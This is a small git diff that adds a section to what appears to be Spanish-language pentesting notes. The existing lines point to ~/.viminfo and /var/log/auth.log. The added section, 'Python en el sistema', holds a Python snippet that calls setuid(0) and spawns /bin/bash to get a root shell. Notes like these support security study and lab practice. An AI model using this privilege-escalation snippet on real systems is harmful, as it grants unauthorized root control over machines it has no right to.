@@ -399,3 +399,10 @@ cat ~/.viminfo
 ```s
 /var/log/auth.log
 ```
+
+#### [](#header-4)Python en el sistema
+```py
+import os
+os.setuid(0)
+os.system("/bin/bash")
+```
